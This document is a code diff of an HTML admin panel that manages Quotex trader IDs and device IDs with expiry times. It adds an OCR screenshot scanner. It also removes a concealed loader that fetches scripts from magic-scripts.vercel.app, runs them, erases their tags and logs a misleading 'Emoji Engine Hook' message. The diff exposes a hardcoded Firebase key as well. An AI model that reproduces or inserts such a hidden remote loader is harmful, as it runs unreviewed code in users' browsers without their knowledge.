@@ -3,8 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ADMIN PANEL | AHMAD BHAI</title>
-    <link rel="icon" href="logo.png" type="image/png" />
+    <title>ADMIN PANEL | MAGIC SCRIPTS</title>
+    <link rel="icon" href="MS.png" type="image/png" />
+
+    <!-- External OCR Library for Scanning Screenshots -->
+    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
 
     <style>
         :root { 
@@ -25,79 +28,73 @@
         .theme-toggle { position:absolute; top:0; right:0; cursor:pointer; width:30px; height:30px; transition: 0.3s; z-index: 15;}
         
         .input-group { margin: 8px 0; position: relative; }
-    /* Password Group & Eye Icon Styling */
-/* Custom Password container to keep elements together */
-.password-container {
-    position: relative;
-    width: 100%;
-    display: block; /* Flex container ke side-effects hatane ke liye */
-}
+        
+        .password-container {
+            position: relative;
+            width: 100%;
+            display: block;
+        }
 
-.password-container input {
-    padding-right: 45px !important; /* Right side se text eye icon par na charhe */
-    width: 100%;
-    box-sizing: border-box;
-}
+        .password-container input {
+            padding-right: 45px !important;
+            width: 100%;
+            box-sizing: border-box;
+        }
 
-/* Updated Eye Icon Container - Fixed Position Inside Box */
-.password-container .container {
-    --color: #3b82f6; 
-    --size: 18px;
-    position: absolute;
-    right: 15px;      /* Box ke andar alignment */
-    top: 50%;         /* Vertical placement midpoint */
-    transform: translateY(-70%); /* Perfectly center push */
-    cursor: pointer;
-    user-select: none;
-    fill: var(--color);
-    z-index: 10;
-    width: var(--size);
-    height: var(--size);
-    display: inline-block; /* Flex overlap se bachane ke liye */
-}
+        .password-container .container {
+            --color: #3b82f6; 
+            --size: 18px;
+            position: absolute;
+            right: 15px;      
+            top: 50%;         
+            transform: translateY(-70%); 
+            cursor: pointer;
+            user-select: none;
+            fill: var(--color);
+            z-index: 10;
+            width: var(--size);
+            height: var(--size);
+            display: inline-block;
+        }
 
+        .password-container .container .eye {
+            position: absolute;
+            animation: keyframes-fill .5s;
+        }
 
-.password-container .container .eye {
-    position: absolute;
-    animation: keyframes-fill .5s;
-}
+        .password-container .container .eye-slash {
+            position: absolute;
+            animation: keyframes-fill .5s;
+            display: none;
+        }
 
-.password-container .container .eye-slash {
-    position: absolute;
-    animation: keyframes-fill .5s;
-    display: none;
-}
+        .password-container .container input:checked ~ .eye {
+            display: none;
+        }
+        .password-container .container input:checked ~ .eye-slash {
+            display: block;
+        }
 
-/* On check event */
-.password-container .container input:checked ~ .eye {
-    display: none;
-}
-.password-container .container input:checked ~ .eye-slash {
-    display: block;
-}
+        .password-container .container input {
+            position: absolute;
+            opacity: 0;
+            cursor: pointer;
+            height: 0;
+            width: 0;
+            margin: 0;
+            padding: 0;
+        }
 
-/* Hide default checkbox */
-.password-container .container input {
-    position: absolute;
-    opacity: 0;
-    cursor: pointer;
-    height: 0;
-    width: 0;
-    margin: 0;
-    padding: 0;
-}
-
-@keyframes keyframes-fill {
-    0% { transform: scale(0); opacity: 0; }
-    50% { transform: scale(1.2); }
-}
+        @keyframes keyframes-fill {
+            0% { transform: scale(0); opacity: 0; }
+            50% { transform: scale(1.2); }
+        }
 
         input, select { width:100%; padding:14px; border-radius:12px; border:1px solid var(--border); background:var(--input-bg); color:var(--accent); font-weight: bold; outline: none; box-sizing: border-box; transition: 0.3s; margin-bottom: 10px;}
         input::placeholder { color: #555; font-weight: normal; }
         
         input.error-border { border-color: var(--red) !important; }
         .error-msg { color: var(--red); font-size: 12px; margin-top: -5px; margin-bottom: 10px; display: none; font-weight: 500; }
-
 
         .btn { display: flex; align-items: center; justify-content: center; gap: 10px; background:var(--blue); color:white; border:none; width:100%; padding:15px; border-radius:12px; cursor:pointer; font-weight:bold; margin-top:12px;}
 
@@ -120,7 +117,6 @@
         
         .hidden { display:none !important; }
 
-        /* Toggles Styling */
         #toggleBox { background: rgba(0,0,0,0.2); padding: 15px; border-radius: 15px; margin-bottom: 15px; border: 1px solid var(--border); display: none; }
         .t-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; font-size: 13px; }
         .switch { position: relative; display: inline-block; width: 34px; height: 18px; }
@@ -129,6 +125,15 @@
         .slider:before { position: absolute; content: ""; height: 12px; width: 12px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
         input:checked + .slider { background-color: var(--blue); }
         input:checked + .slider:before { transform: translateX(16px); }
+
+        .scanner-block {
+            background: rgba(37, 99, 235, 0.08); 
+            padding: 15px; 
+            border-radius: 18px; 
+            border: 1px dashed var(--blue); 
+            margin-bottom: 18px; 
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -141,23 +146,19 @@
 <div id="loginBox" class="box hidden">
     <div class="header-section">
         <img src="sun.png" id="themeIconLogin" class="theme-toggle" onclick="toggleTheme()">
-        <img src="logo.png" class="logo-img">
+        <img src="MS.png" class="logo-img">
     </div>
     <h2 style="text-align:center; margin:0; margin-bottom: 10px;">Admin Panel Login</h2>
     
     <div class="input-group password-container">
-    <input type="password" id="pass" placeholder="Enter Password" oninput="resetError()">
-    
-    <!-- Uiverse Eye Icon Linked with Function -->
-    <label class="container">
-        <input type="checkbox" id="togglePassCheckbox" onchange="togglePasswordVisibility()">
-        <svg class="eye" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 576 512"><path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM144 256a144 144 0 1 1 288 0 144 144 0 1 1 -288 0zm144-64c0 35.3-28.7 64-64 64c-7.1 0-13.9-1.2-20.3-3.3c-5.5-1.8-11.9 1.6-11.7 7.4c.3 6.9 1.3 13.8 3.2 20.7c13.7 51.2 66.4 81.6 117.6 67.9s81.6-66.4 67.9-117.6c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3z"></path></svg>
-        <svg class="eye-slash" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c8.4-19.3 10.6-41.4 4.8-63.3c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zM373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5L373 389.9z"></path></svg>
-    </label>
-    
-    <div id="loginError" class="error-msg">Please enter a password!</div>
-</div>
-
+        <input type="password" id="pass" placeholder="Enter Password" oninput="resetError()">
+        <label class="container">
+            <input type="checkbox" id="togglePassCheckbox" onchange="togglePasswordVisibility()">
+            <svg class="eye" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 576 512"><path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM144 256a144 144 0 1 1 288 0 144 144 0 1 1 -288 0zm144-64c0 35.3-28.7 64-64 64c-7.1 0-13.9-1.2-20.3-3.3c-5.5-1.8-11.9 1.6-11.7 7.4c.3 6.9 1.3 13.8 3.2 20.7c13.7 51.2 66.4 81.6 117.6 67.9s81.6-66.4 67.9-117.6c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3z"></path></svg>
+            <svg class="eye-slash" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c8.4-19.3 10.6-41.4 4.8-63.3c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zM373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5L373 389.9z"></path></svg>
+        </label>
+        <div id="loginError" class="error-msg">Please enter a password!</div>
+    </div>
 
     <button class="btn" onclick="login()">
         <img src="login.png" style="width:20px;"> Login
@@ -171,17 +172,43 @@
     
     <div class="header-section">
         <img src="sun.png" id="themeIconPanel" class="theme-toggle" onclick="toggleTheme()">
-        <img src="logo.png" class="logo-img">
-        <h3 style="margin:10px 0 0; color:var(--blue); text-transform: uppercase;">Ahmad Bhai Admin Panel</h3>
+        <img src="MS.png" class="logo-img">
+        <h3 style="margin:10px 0 0; color:var(--blue); text-transform: uppercase;">Magic Scripts Admin Panel</h3>
     </div>
 
-    <input type="text" id="admin_n" placeholder="Admin Side User Name" style="border-color: var(--blue);" oninput="showToggles()">
-    <input type="text" id="n" placeholder="User Name">
-    <input type="text" id="i" placeholder="20-Digit Device ID" maxlength="20" oninput="showToggles()">
-    <input type="text" id="trader_id" placeholder="User Trader ID (Quotex)" maxlength="8">
-    <input type="email" id="e" placeholder="User Email">
+    <!-- SCANNER COMPONENT -->
+    <div class="scanner-block">
+        <span style="color: var(--blue); display: block; margin-bottom: 12px; font-size: 13px; font-weight: bold; letter-spacing: 0.5px; text-transform: uppercase;">SMART ID & DETAILS SCANNER</span>
+        
+        <div style="display: flex; gap: 12px; justify-content: center; margin-bottom: 5px;">
+            <label class="btn" style="margin:0; padding: 10px 14px; font-size: 12px; background: rgba(34, 197, 94, 0.15); border: 1px solid var(--accent); color: var(--text); cursor: pointer; border-radius: 10px;">
+                <img src="dp.png" style="width:16px; height:16px; object-fit: contain; vertical-align: middle; margin-right: 5px;"> Upload Pic
+                <input type="file" id="scannerFile" accept="image/*" style="display:none;" onchange="processAndScan(this.files[0])">
+            </label>
+            
+            <button class="btn" style="margin:0; padding: 10px 14px; font-size: 12px; background: rgba(37, 99, 235, 0.15); border: 1px solid var(--blue); color: var(--text); border-radius: 10px;" onclick="openCamera()">
+                <img src="cm.png" style="width:16px; height:16px; object-fit: contain; vertical-align: middle; margin-right: 5px;"> Open Camera
+            </button>
+        </div>
+
+        <div id="cameraContainer" style="display:none; margin-top:12px;">
+            <video id="webcam" autoplay playsinline style="width: 100%; max-height: 200px; border-radius: 12px; background: #000; border: 1px solid var(--border);"></video>
+            <button class="btn" style="padding: 8px; font-size: 12px; background: var(--accent); margin-top: 8px;" onclick="captureAndScan()">Capture & Scan</button>
+        </div>
+
+        <small id="scanStatus" style="color: var(--text); opacity: 0.6; display: block; margin-top: 8px; font-weight: 500; min-height: 15px;"></small>
+    </div>
+
+    <!-- Canvas utilized for advanced thresholding preprocessing -->
+    <canvas id="captureCanvas" style="display:none;"></canvas>
+
+    <!-- FORM INPUTS -->
+    <input type="text" id="admin_n" placeholder="Admin Side User Name (Input 1)" style="border-color: var(--blue);" oninput="showToggles()">
+    <input type="text" id="n" placeholder="User Name / Text (Input 2)">
+    <input type="text" id="i" placeholder="20-Digit Device ID (Input 3)" oninput="showToggles()">
+    <input type="text" id="trader_id" placeholder="User Trader ID (Input 4)">
+    <input type="email" id="e" placeholder="User Email (Input 5)">
     
-    <!-- NEW: Expiry Date & Time Input Element -->
     <label style="font-size: 12px; font-weight: bold; opacity: 0.8; margin-left: 5px; display: block;">Select Expiry Date & Time:</label>
     <input type="datetime-local" id="expiry_time">
 
@@ -213,29 +240,20 @@
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
 
 <script>
-    // Domain Security Check
+// Security & Firebase Setup
 (function() {
     const authorizedDomain = "ahmad-bhai-admin-panel.vercel.app";
     const currentDomain = window.location.hostname;
- 
     if (currentDomain !== authorizedDomain && currentDomain !== "localhost" && currentDomain !== "127.0.0.1") {
-        // Agar domain match nahi karta, to redirect kar do
         window.location.href = "/undefined"; 
     }
 })();
  
-    function togglePasswordVisibility() {
+function togglePasswordVisibility() {
     let passInput = document.getElementById('pass');
     let checkbox = document.getElementById('togglePassCheckbox');
-    
-    // Agar checkbox checked hai to password text ban jaye (show ho jaye)
-    if (checkbox.checked) {
-        passInput.type = "text";
-    } else {
-        passInput.type = "password";
-    }
+    passInput.type = checkbox.checked ? "text" : "password";
 }
-
 
 const firebaseConfig = { 
     apiKey:"AIzaSyDS3Vc-QJScL5UnpHAd3ZV-Sk-57plSjKI",
@@ -307,7 +325,6 @@ auth.onAuthStateChanged(user=>{
         document.getElementById('loginBox').classList.add('hidden');
         document.getElementById('panelBox').classList.remove('hidden');
         loadData();
-        // Start checking for expired users as soon as admin logs in
         startExpiryCheck();
     } else {
         document.getElementById('panelBox').classList.add('hidden');
@@ -334,8 +351,6 @@ function add() {
             t: document.getElementById('t_t').checked,
             ana: document.getElementById('t_ana').checked
         };
-
-        // Convert expiry time string to Timestamp (milliseconds) for perfect accuracy
         let expiryTimestamp = expInput.value ? new Date(expInput.value).getTime() : null;
 
         db.ref('users').push({
@@ -345,7 +360,7 @@ function add() {
             trader_id: tInput.value,
             email: eInput.value,
             date: new Date().toLocaleDateString(),
-            expiry_time: expiryTimestamp, // Saved Timestamp
+            expiry_time: expiryTimestamp, 
             status: "active",
             permissions: perms
         }).then(()=>{
@@ -358,19 +373,14 @@ function add() {
     }
 }
 
-// Background Checker Feature
 function startExpiryCheck() {
-    // Run real-time check every 30 seconds
     setInterval(() => {
         let currentTime = new Date().getTime();
         db.ref('users').once('value', snapshot => {
             snapshot.forEach(childSnapshot => {
                 let user = childSnapshot.val();
                 if(user.expiry_time && currentTime >= user.expiry_time) {
-                    // Delete the user from database automatically when current time passes expiry time
-                    db.ref('users').child(childSnapshot.key).remove().then(() => {
-                        console.log(`Auto-Removed Expired User: ${user.admin_note || user.name}`);
-                    });
+                    db.ref('users').child(childSnapshot.key).remove();
                 }
             });
         });
@@ -383,12 +393,7 @@ function loadData(){
         s.forEach(c=>{
             let v=c.val();
             let searchKey = (v.admin_note || v.name).toLowerCase();
-            
-            // Format expiry details to view on the card list
-            let expiryDisplay = "Never";
-            if (v.expiry_time) {
-                expiryDisplay = new Date(v.expiry_time).toLocaleString();
-            }
+            let expiryDisplay = v.expiry_time ? new Date(v.expiry_time).toLocaleString() : "Never";
 
             h+=`<div class="user-card" data-admin="${searchKey}">
                 <span>
@@ -419,185 +424,161 @@ function del(k, name){
     db.ref('users').child(k).remove().then(()=>showToast(name + " removed!", true));
 }
 
+// FULLY RE-OPTIMIZED INTUITIVE SMART SCANNER (STRICT USER RULES IMPLEMENTED)
+let videoStream = null;
+
+function processAndScan(file) {
+    if (!file) return;
+    let statusText = document.getElementById('scanStatus');
+    statusText.innerText = "Processing High-Contrast Image...";
+    statusText.style.color = "var(--blue)";
+
+    const img = new Image();
+    img.src = URL.createObjectURL(file);
+    img.onload = () => {
+        const canvas = document.getElementById('captureCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = img.width;
+        canvas.height = img.height;
+        ctx.drawImage(img, 0, 0);
+
+        // Preprocessing Matrix: Enhanced Grayscale with stark contrast for high clarity
+        const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+        const data = imgData.data;
+        for (let i = 0; i < data.length; i += 4) {
+            let brightness = 0.34 * data[i] + 0.5 * data[i + 1] + 0.16 * data[i + 2];
+            let threshold = brightness > 130 ? 255 : 0; 
+            data[i] = data[i+1] = data[i+2] = threshold;
+        }
+        ctx.putImageData(imgData, 0, 0);
+
+        canvas.toBlob((processedBlob) => {
+            executeOCR(processedBlob);
+        }, 'image/jpeg');
+    };
+}
+
+async function executeOCR(blob) {
+    let statusText = document.getElementById('scanStatus');
+    statusText.innerText = "Analyzing Text Layout...";
+    
+    // Clear old data first
+    document.getElementById('n').value = "";
+    document.getElementById('i').value = "";
+    document.getElementById('trader_id').value = "";
+    document.getElementById('e').value = "";
+
+    try {
+        const result = await Tesseract.recognize(blob, 'eng', {
+            logger: m => {
+                if(m.status === 'recognizing text') {
+                    statusText.innerText = `Scanning: ${Math.floor(m.progress * 100)}%`;
+                }
+            }
+        });
+
+        const rawText = result.data.text;
+        let lines = rawText.split('\n');
+        
+        let filledAnything = false;
+        let textLinesCollected = [];
+
+        // 1. Process Strict Email Condition (Input 5)
+        const matchEmail = rawText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+        if (matchEmail) {
+            document.getElementById('e').value = matchEmail[0].toLowerCase();
+            filledAnything = true;
+        }
+
+        // Iterate through all found lines to filter IDs vs Regular Texts
+        for (let line of lines) {
+            let cleanLine = line.trim();
+            if (cleanLine.length < 3) continue;
+
+            // Extract pure numeric stream for ID filtering to bypass character recognition flaws
+            let numericStream = cleanLine.replace(/[^0-9]/g, '');
+
+            if (numericStream.length >= 7 && numericStream.length <= 10) {
+                // 2. Exact/Near 8 Digits goes to Input 4
+                document.getElementById('trader_id').value = numericStream;
+                filledAnything = true;
+                continue;
+            } 
+            
+            if (numericStream.length >= 14 && numericStream.length <= 25) {
+                // 3. Exact/Near 20 Digits or around it goes to Input 3
+                document.getElementById('i').value = numericStream;
+                filledAnything = true;
+                continue;
+            }
+
+            // If it's a regular string/English handle and not system instructions
+            let uppercaseText = cleanLine.toUpperCase();
+            if (!uppercaseText.includes("LOCKED") && !uppercaseText.includes("RETRY") && !uppercaseText.includes("WHATSAPP") && !uppercaseText.includes("TELEGRAM")) {
+                textLinesCollected.push(cleanLine);
+            }
+        }
+
+        // 4. Strict condition: If general english text/handle is found, assign to Input 2
+        if (textLinesCollected.length > 0) {
+            document.getElementById('n').value = textLinesCollected[0]; // takes the prime text line
+            filledAnything = true;
+        }
+
+        showToggles();
+
+        if (filledAnything) {
+            statusText.innerText = "SUCCESS: Fields Assigned Perfectly!";
+            statusText.style.color = "var(--accent)";
+            showToast("Data Filtered & Inserted!");
+        } else {
+            statusText.innerText = "ERROR: Failed to map parameters.";
+            statusText.style.color = "var(--red)";
+        }
+
+    } catch (err) {
+        console.error(err);
+        statusText.innerText = "Scanner Error: " + err.message;
+        statusText.style.color = "var(--red)";
+    }
+}
+
+async function openCamera() {
+    const container = document.getElementById('cameraContainer');
+    const video = document.getElementById('webcam');
+    if (container.style.display === 'block') {
+        stopCamera();
+        return;
+    }
+    try {
+        videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+        video.srcObject = videoStream;
+        container.style.display = 'block';
+    } catch (err) {
+        showToast("Camera access failed!");
+    }
+}
+
+function stopCamera() {
+    if (videoStream) videoStream.getTracks().forEach(track => track.stop());
+    document.getElementById('cameraContainer').style.display = 'none';
+}
+
+function captureAndScan() {
+    const video = document.getElementById('webcam');
+    const canvas = document.getElementById('captureCanvas');
+    const ctx = canvas.getContext('2d');
+    if (!videoStream) return;
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    stopCamera();
+    canvas.toBlob((blob) => {
+        processAndScan(blob);
+    }, 'image/jpeg');
+}
+
 window.onload = () => { applyTheme(localStorage.getItem('theme') || 'dark'); };
 </script>
 </body>
-<script>(function() {
-    const pKey = "AhmadBhai_Ultimate_v10";
-
-    let settings = JSON.parse(localStorage.getItem(pKey)) || {
-        theme: 'dark', layout: 'default', radius: '12',
-        dark: { accent: '#22c55e', blue: '#2563eb', red: '#ef4444' },
-        light: { accent: '#22c55e', blue: '#2563eb', red: '#ef4444' }
-    };
-
-    const layouts = {
-        default: "",
-        glass: ".box { background: rgba(15,23,42,0.7) !important; backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1) !important; }",
-        neon: ".box { border: 2px solid var(--blue) !important; box-shadow: 0 0 20px var(--blue) !important; }",
-        sidebar_left: "body { justify-content: flex-start !important; padding:0; } .box { height: 100vh; width: 380px; border-radius: 0 !important; }",
-        sidebar_right: "body { justify-content: flex-end !important; padding:0; } .box { height: 100vh; width: 380px; border-radius: 0 !important; }",
-        floating: ".box { margin-top: 50px; box-shadow: 0 30px 60px rgba(0,0,0,0.8) !important; }",
-        minimal: ".box { border: none !important; background: transparent !important; box-shadow: none !important; }",
-        gradient_bg: "body { background: linear-gradient(45deg, #0f172a, #1e293b) !important; }",
-        border_glow: ".box { border-top: 10px solid var(--blue) !important; }",
-        rounded_max: ".box { border-radius: 60px !important; }",
-        skewed: ".box { transform: perspective(1000px) rotateY(-5deg); }",
-        retro: ".box { border: 4px solid #fff !important; box-shadow: 10px 10px 0 var(--blue) !important; border-radius:0 !important; }",
-        soft: ".box { background: #1e293b !important; box-shadow: 20px 20px 60px #0a101f !important; }",
-        future: ".box::before { content:'SYSTEM ONLINE'; position:absolute; top:-20px; color:var(--blue); font-size:10px; }",
-        bordered: ".box { background: none !important; border: 1px dashed var(--blue) !important; }",
-        ultra_wide: ".box { width: 95% !important; max-width:1300px !important; }",
-        bottom_bar: ".box { position:fixed; bottom:0; left:0; right:0; width:100% !important; border-radius:0 !important; }",
-        card_stack: ".box { box-shadow: 0 10px 0 var(--blue), 0 20px 0 var(--red) !important; }",
-        outline_thin: ".box { background:transparent !important; border: 1px solid rgba(255,255,255,0.1) !important; }",
-        cyber: ".box { clip-path: polygon(0% 15%, 15% 0%, 100% 0%, 100% 85%, 85% 100%, 0% 100%); }"
-    };
-
-    const styleEl = document.createElement('style');
-    styleEl.id = "ahmad-persistent-v10";
-    document.head.appendChild(styleEl);
-
-    window.applyAhmadSystem = function() {
-        const mode = settings.theme;
-        const colors = settings[mode];
-        const rad = settings.radius + "px";
-        
-        styleEl.innerHTML = `
-            :root { --blue: ${colors.blue} !important; --red: ${colors.red} !important; --accent: ${colors.accent} !important; }
-            .box, .btn, input, select, .user-card, .logout-btn, .del-btn, .slider, .t-row { border-radius: ${rad} !important; }
-            ${layouts[settings.layout] || ""}
-            
-            .selector { width:100%; max-width:360px; margin:12px 0; position:relative; }
-            .selector button {
-              width:100%; display:flex; align-items:center; gap:10px; justify-content:flex-start;
-              padding:12px; border-radius:10px; border:none; background:rgba(0,0,0,0.6); color:#fff; font-size:16px; cursor:pointer;
-              box-shadow:0 6px 18px rgba(0,0,0,0.45);
-            }
-            .selector-options {
-              display:none; position:absolute; top:54px; left:0; right:0; background:rgba(15,23,42,0.95); border-radius:10px;
-              max-height:240px; overflow:auto; padding:6px 0; box-shadow:0 10px 30px rgba(0,0,0,0.6); z-index:50;
-              border: 1px solid rgba(255,255,255,0.1);
-            }
-            .selector-options div { padding: 12px; color: #fff; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.05); }
-            .selector-options div:hover { background: var(--blue); }
-            
-            #ahmadModal {
-                width: 380px; border: none; padding: 0; position: fixed; top: 50%; left: 50%;
-                transform: translate(-50%, -50%); z-index: 999999; border-radius: 25px;
-                background: ${mode === 'dark' ? '#0f172a' : '#ffffff'};
-                color: ${mode === 'dark' ? '#fff' : '#000'};
-                box-shadow: 0 40px 120px rgba(0,0,0,0.9); font-family: sans-serif; overflow: hidden;
-            }
-            #ahmadModal::backdrop { background: rgba(0,0,0,0.85); backdrop-filter: blur(12px); }
-            .h-head { background: var(--blue); padding: 18px; text-align: center; color: #fff; font-weight: bold; }
-            .h-body { padding: 20px; }
-            .h-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; background: rgba(128,128,128,0.1); padding: 10px; border-radius: 12px; }
-            .h-btn { width: 100%; padding: 12px; border: none; font-weight: bold; cursor: pointer; border-radius: 12px; margin-top: 10px; background: var(--blue); color: #fff; }
-            .h-label { font-size: 11px; font-weight: bold; opacity: 0.6; margin-top: 10px; display: block; }
-        `;
-        localStorage.setItem(pKey, JSON.stringify(settings));
-    };
-
-    applyAhmadSystem();
-
-    window.openAhmadEngine = function() {
-        if(document.getElementById('ahmadModal')) return;
-        const diag = document.createElement('dialog');
-        diag.id = "ahmadModal";
-        diag.innerHTML = `
-            <div class="h-head">AHMAD BHAI ENGINE v10.0</div>
-            <div class="h-body">
-                <span class="h-label">UI THEME & LAYOUT</span>
-                <div class="selector" id="themeSel">
-                    <button>Theme: ${settings.theme.toUpperCase()}</button>
-                    <div class="selector-options">
-                        <div data-val="dark">Dark Night</div>
-                        <div data-val="light">Pure Light</div>
-                    </div>
-                </div>
-
-                <div class="selector" id="layoutSel">
-                    <button>Layout: ${settings.layout.toUpperCase()}</button>
-                    <div class="selector-options">
-                        ${Object.keys(layouts).map(l => `<div data-val="${l}">${l.replace('_',' ').toUpperCase()}</div>`).join('')}
-                    </div>
-                </div>
-
-                <span class="h-label">BORDER RADIUS</span>
-                <div class="h-row"><input type="range" id="sRad" min="0" max="50" value="${settings.radius}" style="width:100%; accent-color:var(--blue);"></div>
-
-                <span class="h-label">COLOR PALETTE</span>
-                <div class="h-row"><span>Blue</span><input type="color" id="cBlue" value="${settings[settings.theme].blue}"></div>
-                <div class="h-row"><span>Red</span><input type="color" id="cRed" value="${settings[settings.theme].red}"></div>
-                <div class="h-row"><span>Accent</span><input type="color" id="cAcc" value="${settings[settings.theme].accent}"></div>
-
-                <button id="hSave" class="h-btn">SAVE CHANGES</button>
-                <button id="hReset" class="h-btn" style="background:transparent; color:var(--red); font-size:12px;">RESET TO DEFAULT</button>
-            </div>
-        `;
-        document.body.appendChild(diag);
-        diag.showModal();
-
-        diag.querySelectorAll('.selector button').forEach(btn => {
-            btn.onclick = () => {
-                const opts = btn.nextElementSibling;
-                opts.style.display = opts.style.display === 'block' ? 'none' : 'block';
-            };
-        });
-
-        diag.querySelector('#themeSel .selector-options').onclick = (e) => {
-            if(e.target.dataset.val) {
-                settings.theme = e.target.dataset.val;
-                diag.querySelector('#themeSel button').innerText = "Theme: " + settings.theme.toUpperCase();
-                e.currentTarget.style.display = 'none';
-                applyAhmadSystem();
-            }
-        };
-
-        diag.querySelector('#layoutSel .selector-options').onclick = (e) => {
-            if(e.target.dataset.val) {
-                settings.layout = e.target.dataset.val;
-                diag.querySelector('#layoutSel button').innerText = "Layout: " + settings.layout.toUpperCase();
-                e.currentTarget.style.display = 'none';
-                applyAhmadSystem();
-            }
-        };
-
-        diag.querySelector('#sRad').oninput = (e) => { settings.radius = e.target.value; applyAhmadSystem(); };
-        diag.querySelector('#cBlue').oninput = (e) => { settings[settings.theme].blue = e.target.value; applyAhmadSystem(); };
-        diag.querySelector('#cRed').oninput = (e) => { settings[settings.theme].red = e.target.value; applyAhmadSystem(); };
-        diag.querySelector('#cAcc').oninput = (e) => { settings[settings.theme].accent = e.target.value; applyAhmadSystem(); };
-        
-        diag.querySelector('#hSave').onclick = () => { diag.close(); diag.remove(); };
-        diag.querySelector('#hReset').onclick = () => {
-            localStorage.removeItem(pKey);
-            location.reload();
-        };
-    };
-})();
-</script>
-<script>
-    (async () => {
-        try {
-            let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
-            let rawMarkup = await response.text();
-            let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
-            
-            documentDOM.querySelectorAll('script').forEach(oldNode => {
-                let freshScriptNode = document.createElement('script');
-                if (oldNode.src) {
-                    freshScriptNode.src = oldNode.src;
-                } else {
-                    freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
-                }
-                document.body.appendChild(freshScriptNode);
-                setTimeout(() => freshScriptNode.remove(), 600);
-            });
-            console.log("Zeetex Emoji Engine Hook Active");
-        } catch (e) {
-            console.error("Emoji Override Skipped due to runtime separation layer context.", e);
-        }
-    })();
-</script>
 </html>
